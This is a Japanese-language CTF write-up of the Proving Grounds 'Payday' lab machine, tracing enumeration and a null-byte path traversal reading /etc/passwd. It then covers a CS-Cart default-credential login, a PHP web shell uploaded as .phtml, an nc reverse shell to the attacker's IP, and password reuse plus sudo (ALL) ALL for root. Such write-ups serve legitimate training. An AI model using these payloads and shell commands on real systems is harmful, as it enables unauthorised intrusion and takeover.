+++
title = "Proving Grounds Practice - Payday - Writeup"
date = "2026-10-11"
description = "CS-Cartの認証後RCE(Template Editorのファイル拡張子フィルタ回避)からwww-dataを取得し、弱いパスワードでpatrickへ横移動後、sudo (ALL) ALLの誤設定を悪用してroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[CS-Cart]", "[RCE]", "[sudo]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field   | Details |
| ------- | ------- |
| Machine | Payday |
| OS      | Linux |

---

## TL;DR

対象は古いLinuxサーバーで、**CS-Cart (80)** と脆弱な **Samba (139/445)**、**Dovecot (110/143/993/995)** が稼働していた。`/install` ディレクトリが残存しておりデフォルト管理者資格情報 `admin:admin` でログインに成功。Template Editor機能を使い `.phtml` 拡張子でPHP Webシェルをアップロードすることで認証後RCEを獲得し、`www-data` シェルを取得した。ローカルユーザー `patrick` へは同名パスワードで横移動し、`sudo -l` の結果 `(ALL) ALL` が許可されていたため `sudo su` で即座にrootを取得した。

---

## Reconnaissance

### Nmapスキャン

```bash
nmap -sV -sC 192.168.116.39
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.4 (PHP/5.2.3-1ubuntu6)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
```

80番ポートのバナーから **CS-Cart** という古いPHP製ショッピングカートCMSが動作していることが分かる。Apache 2.2.4 / PHP 5.2.3という非常に古いバージョンであることから、既知の脆弱性が存在する可能性が高い。

`smb-os-discovery` スクリプトから、コンピュータ名が `payday` であることも確認できた。

### ディレクトリ列挙 (Gobuster)

```bash
gobuster dir -u 192.168.116.39/ -w /usr/share/wordlists/dirb/common.txt
```

```text
admin                 (Status: 200) [Size: 9483]
admin.php             (Status: 200) [Size: 9483]
install               (Status: 200) [Size: 7731]
payments              (Status: 301) [Size: 337] [--> http://192.168.116.39/payments/]
skins                 (Status: 301) [Size: 334] [--> http://192.168.116.39/skins/]
```

`/admin` の管理画面に加えて、本来インストール後は削除されるべき **`/install`** ディレクトリが残っている点が目を引く。CS-Cartのインストーラが残存していることが多くの脆弱性情報と結びつくため、searchsploitで該当バージョンの既知脆弱性を調べる。

---

## Initial Access

### Local File Inclusion による情報収集

CS-Cartの既知脆弱性(Exploit-DB #48890)を参考に、`classes_dir` パラメータでパストラバーサルを試みた。

```text
http://192.168.116.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

Null byte injectionを利用したパストラバーサルにより `/etc/passwd` の内容を取得でき、ユーザー `patrick` (UID 1000) の存在が確認できた。これは古いPHP(5.x系)でnull byteがパス末尾を切り詰める挙動を悪用したものである。

### デフォルト資格情報による管理画面ログイン

`/admin` の管理画面に対して、よく知られたデフォルト資格情報を試したところログインに成功した。

```text
admin : admin
```

### Template Editor経由のファイルアップロードRCE (Exploit-DB #48891)

CS-Cart管理画面の **Design > Template Editor** 機能は、本来テンプレート(`.tpl`)ファイルの編集用だが、拡張子チェックが不十分なため `.phtml` のようなPHPとして実行可能な拡張子でファイルを作成できる。この挙動を悪用し、以下のようなWebシェルを `skins/` 配下にアップロードした。

```php
<?php echo system($_GET['cmd']); ?>
```

アップロード後、該当ファイルへ直接アクセスしてコマンド実行を確認する。

```text
http://192.168.116.39/skins/revr.phtml?cmd=ls
```

```text
default_blue new_vision_blue rev.phtml revr.phtml revrse.phtml
```

任意コマンド実行が確認できたため、`nc` を用いたリバースシェルのコマンドを `cmd` パラメータ経由で送信する。

```text
http://192.168.116.39/skins/revr.phtml?cmd=nc+192.168.45.202+4444+-c+bash
```

攻撃側でリスナーを起動しておくことで接続を受ける。

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.116.39] 50491
```

シェル取得後、PTYを安定化させる。

```bash
script /dev/null -c bash
```

`www-data` 権限のシェルを取得できた。

---

## Privilege Escalation

### www-data から patrick への横移動

`/etc/passwd` から判明していた `patrick` というユーザー名に対し、同名のパスワード(`patrick:patrick`)を試したところSSHログインに成功した。鍵交換アルゴリズムが古いため、以下のように明示的に指定する必要があった。

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa patrick@192.168.116.39
```

ログイン後、ホームディレクトリに `local.txt`(ユーザーフラグ)が存在することを確認した。

### sudo権限の誤設定を悪用したroot昇格

```bash
sudo -l
```

```text
User patrick may run the following commands on this host:
    (ALL) ALL
```

`patrick` はパスワードを知っていれば任意のコマンドをrootとして実行できる状態だった。これは典型的なsudoの設定不備であり、以下のコマンドで即座にroot権限のシェルを取得できる。

```bash
sudo -s
```

```text
root@payday:/root# ls
capture.cap  proof.txt
```

`/root` 配下の `proof.txt`(ルートフラグ)を確認し、権限昇格の完了を確認した。

---

## Summary

今回の攻撃経路は以下の通りである。

```text
Nmap
  ↓
古いCS-Cart (Apache 2.2.4 / PHP 5.2.3) を確認
  ↓
Gobusterで /install, /admin の残存を確認
  ↓
パストラバーサルで /etc/passwd を取得 → ユーザー patrick の存在が判明
  ↓
admin:admin でCS-Cart管理画面にログイン
  ↓
Template Editorの拡張子フィルタ不備を悪用し .phtml Webシェルをアップロード
  ↓
www-data としてリバースシェル獲得
  ↓
patrick:patrick でSSHログイン (横移動)
  ↓
sudo -l で (ALL) ALL を確認
  ↓
sudo -s でroot権限取得
```

### Key Commands

```bash
# ポートスキャン
nmap -sV -sC 192.168.116.39

# ディレクトリ列挙
gobuster dir -u 192.168.116.39/ -w /usr/share/wordlists/dirb/common.txt

# /etc/passwd取得 (パストラバーサル)
curl "http://192.168.116.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"

# Webシェル経由のリバースシェル
http://192.168.116.39/skins/revr.phtml?cmd=nc+<LHOST>+4444+-c+bash

# リスナー
nc -lvnp 4444

# PTY安定化
script /dev/null -c bash

# SSHログイン (古い鍵交換アルゴリズムを許可)
ssh -o HostKeyAlgorithms=+ssh-rsa patrick@192.168.116.39

# sudo権限確認・root昇格
sudo -l
sudo -s
```
